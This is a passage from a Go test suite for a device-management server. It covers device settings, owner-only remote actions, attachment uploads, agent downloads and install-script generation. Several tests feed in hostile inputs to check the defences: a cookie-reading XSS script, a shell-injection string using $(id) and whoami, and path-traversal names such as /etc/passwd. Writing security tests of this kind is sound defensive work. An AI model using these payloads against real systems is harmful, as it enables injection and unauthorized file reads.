	}
}

func TestInvalidLynisReportDoesNotCompleteCommand(t *testing.T) {
	s := newTestServer(t)
	ownerID, _, _ := newAuthedDevice(t, s, "lynis-invalid@example.com")
	device, err := s.store.RegisterDevice("lynis-invalid-pc", "", ownerID, "")
	if err != nil {
		t.Fatal(err)
	}
	command, err := s.store.QueueCommand(device.ID, "lynis_audit", "", "", "", "")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := json.Marshal(commandResultRequest{DeviceToken: device.DeviceToken, Status: "completed", Message: "not-json"})
	req := httptest.NewRequest(http.MethodPost, "/api/devices/"+device.ID+"/commands/"+command.ID, bytes.NewReader(body))
	rec := httptest.NewRecorder()
	s.handleCommandResult(rec, req, device.ID, command.ID)
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("result status = %d, want 500", rec.Code)
	}
	got, err := s.store.GetCommand(command.ID, device.ID)
	if err != nil || got.Status != "queued" {
		t.Fatalf("command after invalid report = %+v, err = %v", got, err)
	}
	audits, err := s.store.GetSecurityAudits(device.ID, 1)
	if err != nil || len(audits) != 0 {
		t.Fatalf("saved audits = %+v, err = %v", audits, err)
	}
}

func TestDeviceSettingsOwnerAndAgentFlows(t *testing.T) {
	s := newTestServer(t)
	ownerID, sessionToken, _ := newAuthedDevice(t, s, "device-settings@example.com")
	device, err := s.store.RegisterDevice("settings-pc", "", ownerID, "")
	if err != nil {
		t.Fatal(err)
	}

	patch := func(token, body string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodPatch, "/api/devices/"+device.ID, strings.NewReader(body))
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		rec := httptest.NewRecorder()
		s.handleDeviceDetail(rec, req)
		return rec
	}

	rec := patch(sessionToken, `{"display_name":"Main PC","tags":["gaming","work"],"collection_interval_seconds":30}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("owner PATCH = %d: %s", rec.Code, rec.Body.String())
	}
	var settings store.DeviceSettings
	if uerr := json.Unmarshal(rec.Body.Bytes(), &settings); uerr != nil {
		t.Fatal(uerr)
	}
	if settings.DisplayName != "Main PC" || settings.CollectionIntervalSeconds != 30 || len(settings.Tags) != 2 {
		t.Fatalf("PATCH response = %+v", settings)
	}

	getReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+device.ID+"/settings", nil)
	getReq.Header.Set("Authorization", "Bearer "+device.DeviceToken)
	getRec := httptest.NewRecorder()
	s.handleDeviceDetail(getRec, getReq)
	if getRec.Code != http.StatusOK {
		t.Fatalf("agent GET = %d: %s", getRec.Code, getRec.Body.String())
	}
	var agentSettings store.DeviceSettings
	if uerr := json.Unmarshal(getRec.Body.Bytes(), &agentSettings); uerr != nil {
		t.Fatal(uerr)
	}
	if agentSettings.DisplayName != settings.DisplayName || agentSettings.CollectionIntervalSeconds != settings.CollectionIntervalSeconds || !reflect.DeepEqual(agentSettings.Tags, settings.Tags) {
		t.Fatalf("agent settings = %+v, want %+v", agentSettings, settings)
	}

	if rec := patch(sessionToken, `{"display_name":"bad","tags":[],"collection_interval_seconds":15}`); rec.Code != http.StatusBadRequest {
		t.Fatalf("invalid interval PATCH = %d, want 400", rec.Code)
	}
	if rec := patch(device.DeviceToken, `{"display_name":"agent","tags":[],"collection_interval_seconds":10}`); rec.Code != http.StatusForbidden {
		t.Fatalf("device-token PATCH = %d, want 403", rec.Code)
	}

	otherUser, err := s.store.CreateUser("foreign-settings@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	otherSession, err := s.store.CreateSession(otherUser.ID)
	if err != nil {
		t.Fatal(err)
	}
	if rec := patch(otherSession.Token, `{"display_name":"foreign","tags":[],"collection_interval_seconds":10}`); rec.Code != http.StatusForbidden {
		t.Fatalf("foreign owner PATCH = %d, want 403", rec.Code)
	}
}

func TestDeviceActionsQueueOnlyExplicitOwnerCommands(t *testing.T) {
	s := newTestServer(t)
	ownerID, sessionToken, _ := newAuthedDevice(t, s, "remote-actions@example.com")
	device, err := s.store.RegisterDevice("actions-pc", "", ownerID, "")
	if err != nil {
		t.Fatal(err)
	}
	request := func(token, action string) *httptest.ResponseRecorder {
		body, _ := json.Marshal(map[string]string{"action": action})
		req := httptest.NewRequest(http.MethodPost, "/api/devices/"+device.ID+"/actions", bytes.NewReader(body))
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		rec := httptest.NewRecorder()
		s.handleDeviceDetail(rec, req)
		return rec
	}

	if rec := request(sessionToken, "restart_agent"); rec.Code != http.StatusServiceUnavailable {
		t.Fatalf("disabled mutations status = %d, want 503", rec.Code)
	}
	s.flags.EnableRemoteMutations = true
	for _, action := range []string{"restart_agent", "update_packages", "reboot_device"} {
		rec := request(sessionToken, action)
		if rec.Code != http.StatusAccepted {
			t.Fatalf("queue %s = %d: %s", action, rec.Code, rec.Body.String())
		}
		var command store.DeviceCommand
		if uerr := json.Unmarshal(rec.Body.Bytes(), &command); uerr != nil {
			t.Fatal(uerr)
		}
		if command.Type != action || command.Status != "queued" {
			t.Fatalf("queued action = %+v, want %s", command, action)
		}
		if duplicate := request(sessionToken, action); duplicate.Code != http.StatusConflict {
			t.Fatalf("duplicate %s = %d, want 409", action, duplicate.Code)
		}
	}
	if rec := request(sessionToken, "run arbitrary command"); rec.Code != http.StatusBadRequest {
		t.Fatalf("unsupported action status = %d, want 400", rec.Code)
	}
	if rec := request(device.DeviceToken, "reboot_device"); rec.Code != http.StatusNotFound {
		t.Fatalf("device-token action status = %d, want 404", rec.Code)
	}
}

// TestAttachmentHtmlCannotExecuteInline ensures an uploaded HTML payload is
// stored/served as an opaque download, never as executable inline content.
func TestAttachmentHtmlCannotExecuteInline(t *testing.T) {
	s := newTestServer(t)
	ownerID, token, deviceID := newAuthedDevice(t, s, "att-html@example.com")

	body, ctype := buildMultipart(t, "payload.html", "text/html", []byte("<script>alert(document.cookie)</script>"))
	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
	if rec.Code != http.StatusCreated {
		t.Fatalf("upload status = %d body=%s", rec.Code, rec.Body.String())
	}

	atts, err := s.store.GetDeviceAttachments(deviceID, ownerID)
	if err != nil || len(atts) != 1 {
		t.Fatalf("attachments = %v, err = %v", atts, err)
	}
	if atts[0].MimeType != "application/octet-stream" {
		t.Fatalf("stored mime = %q, want application/octet-stream", atts[0].MimeType)
	}

	dlReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+deviceID+"/attachments/"+atts[0].ID, nil)
	dlReq.Header.Set("Authorization", "Bearer "+token)
	dlRec := httptest.NewRecorder()
	s.handleDeviceAttachmentByID(dlRec, dlReq, deviceID, atts[0].ID)

	if ct := dlRec.Header().Get("Content-Type"); ct != "application/octet-stream" {
		t.Fatalf("download content-type = %q, want application/octet-stream", ct)
	}
	if cd := dlRec.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
		t.Fatalf("download disposition = %q, want attachment", cd)
	}
	if csp := dlRec.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "sandbox") {
		t.Fatalf("download missing sandbox CSP, got %q", csp)
	}
}

// TestAttachmentImageServedInline ensures real images are still served inline.
func TestAttachmentImageServedInline(t *testing.T) {
	s := newTestServer(t)
	ownerID, token, deviceID := newAuthedDevice(t, s, "att-png@example.com")

	png := append([]byte("\x89PNG\r\n\x1a\n"), bytes.Repeat([]byte{0}, 512)...)
	body, ctype := buildMultipart(t, "pic.png", "image/png", png)
	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
	if rec.Code != http.StatusCreated {
		t.Fatalf("upload status = %d body=%s", rec.Code, rec.Body.String())
	}

	atts, err := s.store.GetDeviceAttachments(deviceID, ownerID)
	if err != nil || len(atts) != 1 {
		t.Fatalf("attachments = %v, err = %v", atts, err)
	}
	if atts[0].MimeType != "image/png" {
		t.Fatalf("stored mime = %q, want image/png", atts[0].MimeType)
	}

	dlReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+deviceID+"/attachments/"+atts[0].ID, nil)
	dlReq.Header.Set("Authorization", "Bearer "+token)
	dlRec := httptest.NewRecorder()
	s.handleDeviceAttachmentByID(dlRec, dlReq, deviceID, atts[0].ID)

	if ct := dlRec.Header().Get("Content-Type"); ct != "image/png" {
		t.Fatalf("download content-type = %q, want image/png", ct)
	}
	if cd := dlRec.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "inline") {
		t.Fatalf("download disposition = %q, want inline", cd)
	}
}

// TestAgentDownloadStreamsBinaryWithLengthAndRange proves the agent download
// sends a correct Content-Length and honors Range requests, so a transfer cut
// by a restart can be resumed instead of restarting from zero.
func TestAgentDownloadStreamsBinaryWithLengthAndRange(t *testing.T) {
	s := newTestServer(t)
	payload := bytes.Repeat([]byte("sync-win-agent-binary-"), 4096)
	binaryPath := filepath.Join(t.TempDir(), "sync-win-agent")
	if err := os.WriteFile(binaryPath, payload, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SYNCWIN_AGENT_BINARY", binaryPath)

	handler := gzipMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.handleAgentDownload(w, r)
	}))

	req := httptest.NewRequest(http.MethodGet, "/api/agent/download", nil)
	req.Header.Set("Accept-Encoding", "gzip")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}
	if enc := rec.Header().Get("Content-Encoding"); enc != "" {
		t.Fatalf("binary download must not be gzipped, got Content-Encoding %q", enc)
	}
	if got := rec.Header().Get("Content-Length"); got != fmt.Sprintf("%d", len(payload)) {
		t.Fatalf("Content-Length = %q, want %d", got, len(payload))
	}
	if !bytes.Equal(rec.Body.Bytes(), payload) {
		t.Fatalf("downloaded %d bytes, want %d", rec.Body.Len(), len(payload))
	}

	rangeReq := httptest.NewRequest(http.MethodGet, "/api/agent/download", nil)
	rangeReq.Header.Set("Range", "bytes=0-9")
	rangeRec := httptest.NewRecorder()
	handler.ServeHTTP(rangeRec, rangeReq)
	if rangeRec.Code != http.StatusPartialContent {
		t.Fatalf("range status = %d, want 206", rangeRec.Code)
	}
	if !bytes.Equal(rangeRec.Body.Bytes(), payload[:10]) {
		t.Fatalf("range body = %q", rangeRec.Body.Bytes())
	}
}

// TestGzipMiddlewareStillCompressesJSON guards the compressible-type check so
// JSON APIs keep their gzip savings.
func TestGzipMiddlewareStillCompressesJSON(t *testing.T) {
	handler := gzipMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	req := httptest.NewRequest(http.MethodGet, "/api/thing", nil)
	req.Header.Set("Accept-Encoding", "gzip")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	if enc := rec.Header().Get("Content-Encoding"); enc != "gzip" {
		t.Fatalf("JSON response should be gzipped, got Content-Encoding %q", enc)
	}
}

// TestAttachmentBetweenTwoAndEightMBIsAccepted proves the global 2 MB JSON cap
// no longer truncates attachment uploads (the route cap is 8 MB).
func TestAttachmentBetweenTwoAndEightMBIsAccepted(t *testing.T) {
	s := newTestServer(t)
	_, token, deviceID := newAuthedDevice(t, s, "att-big@example.com")

	data := bytes.Repeat([]byte("a"), 3<<20)
	body, ctype := buildMultipart(t, "blob.bin", "application/octet-stream", data)
	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
	if rec.Code != http.StatusCreated {
		t.Fatalf("3 MB upload status = %d body=%s", rec.Code, rec.Body.String())
	}
}

// TestAttachmentOverEightMBIsRejected ensures the per-route cap still applies.
func TestAttachmentOverEightMBIsRejected(t *testing.T) {
	s := newTestServer(t)
	_, token, deviceID := newAuthedDevice(t, s, "att-huge@example.com")

	data := bytes.Repeat([]byte("a"), 9<<20)
	body, ctype := buildMultipart(t, "huge.bin", "application/octet-stream", data)
	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("9 MB upload status = %d, want 400 body=%s", rec.Code, rec.Body.String())
	}
}

func TestIsAttachmentUpload(t *testing.T) {
	post := httptest.NewRequest(http.MethodPost, "/api/devices/dev-1/attachments", nil)
	if !isAttachmentUpload(post) {
		t.Fatal("POST /attachments should bypass the global JSON cap")
	}
	for _, req := range []*http.Request{
		httptest.NewRequest(http.MethodGet, "/api/devices/dev-1/attachments", nil),
		httptest.NewRequest(http.MethodPost, "/api/devices/dev-1/sync", nil),
	} {
		if isAttachmentUpload(req) {
			t.Fatalf("%s %s should not bypass the global JSON cap", req.Method, req.URL.Path)
		}
	}
}

func TestPublicBaseURLHonorsConfiguredValue(t *testing.T) {
	t.Setenv("SYNCWIN_PUBLIC_URL", "https://sync-win.example.com/")
	req := httptest.NewRequest(http.MethodGet, "/install/token", nil)
	got, err := publicBaseURL(req)
	if err != nil {
		t.Fatal(err)
	}
	if got != "https://sync-win.example.com" {
		t.Fatalf("publicBaseURL = %q, want https://sync-win.example.com", got)
	}
}

func TestPublicBaseURLRejectsInvalidConfiguredValue(t *testing.T) {
	t.Setenv("SYNCWIN_PUBLIC_URL", "ftp://sync-win.example.com")
	if _, err := publicBaseURL(httptest.NewRequest(http.MethodGet, "/install/token", nil)); err == nil {
		t.Fatal("expected error for non-http(s) SYNCWIN_PUBLIC_URL")
	}
}

func TestShellDoubleQuoteNeutralizesInjection(t *testing.T) {
	got := shellDoubleQuote("x\"; $(id); `whoami`")
	for _, want := range []string{`\"`, `\$(id)`, "\\`"} {
		if !strings.Contains(got, want) {
			t.Fatalf("shellDoubleQuote result %q missing escaped %q", got, want)
		}
	}
}

func TestAgentSignatureEndpoint(t *testing.T) {
	s := newTestServer(t)

	sigPath := filepath.Join(t.TempDir(), "sync-win-agent.sig")
	if err := os.WriteFile(sigPath, []byte("c2lnbmF0dXJl\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SYNCWIN_AGENT_SIGNATURE", sigPath)

	rec := httptest.NewRecorder()
	s.handleAgentSignature(rec, httptest.NewRequest(http.MethodGet, "/api/agent/signature", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "c2lnbmF0dXJl") {
		t.Fatalf("body = %q", rec.Body.String())
	}

	// A missing or empty signature must be reported as unavailable, never as a
	// valid empty signature.
	t.Setenv("SYNCWIN_AGENT_SIGNATURE", filepath.Join(t.TempDir(), "missing.sig"))
	missing := httptest.NewRecorder()
	s.handleAgentSignature(missing, httptest.NewRequest(http.MethodGet, "/api/agent/signature", nil))
	if missing.Code != http.StatusNotFound {
		t.Fatalf("missing signature status = %d, want 404", missing.Code)
	}
}

func TestTelemetryHistoryRejectsInvalidRange(t *testing.T) {
	s := newTestServer(t)
	_, token, deviceID := newAuthedDevice(t, s, "telemetry@example.com")

	cases := []string{
		"/api/devices/" + deviceID + "/telemetry/history?from=not-a-date",
		"/api/devices/" + deviceID + "/telemetry/history?to=not-a-date",
		"/api/devices/" + deviceID + "/telemetry/history?from=2024-01-02T00:00:00Z&to=2024-01-01T00:00:00Z",
	}
	for _, target := range cases {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		rec := httptest.NewRecorder()
		s.handleTelemetryHistoryV2(rec, req, deviceID)
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("%s: status = %d, want 400", target, rec.Code)
		}
	}
}

// The agent updater fetches its systemd unit from here. Without it a unit change
// (a new SupplementaryGroups entry) never reaches devices, because the updater
// only ever replaced the binary.
func TestAgentUnitTemplateRendersForAuthenticatedDevice(t *testing.T) {
	s := newTestServer(t)
	user, err := s.store.CreateUser("unit@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	device, err := s.store.RegisterDevice("pc-a", user.ID, user.ID, "")
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet,
		"/api/agent/unit?device_id="+device.ID+"&device_token="+device.DeviceToken, nil)
	// The endpoint reads the template from /app, which does not exist in tests.
	// A 404 there is the expected outcome; what matters is that authentication
	// is enforced before the read.
	rec := httptest.NewRecorder()
	s.handleAgentUnitTemplate(rec, req)
	if rec.Code == http.StatusOK && !strings.Contains(rec.Body.String(), "[Service]") {
		t.Errorf("unit template served without a [Service] section: %s", rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "{{SERVER_URL}}") {
		t.Error("unit was served with unresolved placeholders")
	}

	unauth := httptest.NewRequest(http.MethodGet, "/api/agent/unit?device_id="+device.ID+"&device_token=wrong", nil)
	unauthRec := httptest.NewRecorder()
	s.handleAgentUnitTemplate(unauthRec, unauth)
	if unauthRec.Code != http.StatusUnauthorized {
		t.Errorf("bad token status = %d, want 401", unauthRec.Code)
	}

	missing := httptest.NewRequest(http.MethodGet, "/api/agent/unit", nil)
	missingRec := httptest.NewRecorder()
	s.handleAgentUnitTemplate(missingRec, missing)
	if missingRec.Code != http.StatusBadRequest {
		t.Errorf("missing credentials status = %d, want 400", missingRec.Code)
	}
}

func TestInstallScriptEmbedsCapabilityChoices(t *testing.T) {
	s := newTestServer(t)
	user, err := s.store.CreateUser("install@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	token, err := s.store.CreateEnrollmentToken(user.ID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/install/"+token+"?ssh=1&autoupdate=0", nil)
	rec := httptest.NewRecorder()
	s.handleInstallScript(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	body := rec.Body.String()
	if !strings.Contains(body, `SYNCWIN_SSH_ON_INSTALL="1"`) {
		t.Fatalf("ssh choice missing from installer:\n%s", body[:min(400, len(body))])
	}
	if !strings.Contains(body, `SYNCWIN_AUTO_UPDATE="0"`) {
		t.Fatalf("autoupdate opt-out missing from installer:\n%s", body[:min(400, len(body))])
	}

	// No choice carried: the capability is left unset so the installer can ask
	// (or default), and auto-update is not forced off.
	defaultToken, err := s.store.CreateEnrollmentToken(user.ID)
	if err != nil {
		t.Fatal(err)
	}
	defaultRec := httptest.NewRecorder()
	s.handleInstallScript(defaultRec, httptest.NewRequest(http.MethodGet, "/install/"+defaultToken, nil))
	if got := defaultRec.Body.String(); strings.Contains(got, "SYNCWIN_SSH_ON_INSTALL=") || strings.Contains(got, `SYNCWIN_AUTO_UPDATE="0"`) {
		t.Fatalf("installer must not pin capabilities it was not given:\n%s", got[:min(400, len(got))])
	}
}

// The installer runs on a device and cannot read /app, so it fetches the unit
// templates. Serving from a map keyed by short name is what keeps this from
// being an arbitrary file read of the server's filesystem.
func TestAgentUnitFileServesOnlyAllowlistedTemplates(t *testing.T) {
	dir := t.TempDir()
	for _, name := range agentUnitFiles {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("[Unit]\nDescription="+name+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("SYNCWIN_UNIT_DIR", dir)

	s := newTestServer(t)
	for key, name := range agentUnitFiles {
		req := httptest.NewRequest(http.MethodGet, "/api/agent/units?name="+key, nil)
		rec := httptest.NewRecorder()
		s.handleAgentUnitFile(rec, req)
		if rec.Code != http.StatusOK {
			t.Errorf("name=%s: status = %d, want 200", key, rec.Code)
			continue
		}
		if !strings.Contains(rec.Body.String(), "[Unit]") {
			t.Errorf("name=%s: body = %q", key, rec.Body.String())
		}
		if !strings.Contains(rec.Body.String(), name) {
			t.Errorf("name=%s: served the wrong template: %q", key, rec.Body.String())
		}
	}
}

func TestAgentUnitFileRejectsEverythingElse(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "sync-win-agent.service"), []byte("[Unit]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SYNCWIN_UNIT_DIR", dir)

	s := newTestServer(t)
	// A traversal attempt, a bare filename and an empty value must all miss the
	// allowlist rather than reach the filesystem.
	for _, name := range []string{"", "../sync-win-agent.service", "/etc/passwd", "sync-win-agent.service", "AGENT", "agent/../agent"} {
		req := httptest.NewRequest(http.MethodGet, "/api/agent/units?name="+url.QueryEscape(name), nil)
		rec := httptest.NewRecorder()
		s.handleAgentUnitFile(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Errorf("name=%q: status = %d, want 404", name, rec.Code)
		}
	}

	post := httptest.NewRequest(http.MethodPost, "/api/agent/units?name=agent", nil)
	postRec := httptest.NewRecorder()
	s.handleAgentUnitFile(postRec, post)
	if postRec.Code != http.StatusMethodNotAllowed {
		t.Errorf("POST status = %d, want 405", postRec.Code)
	}
}
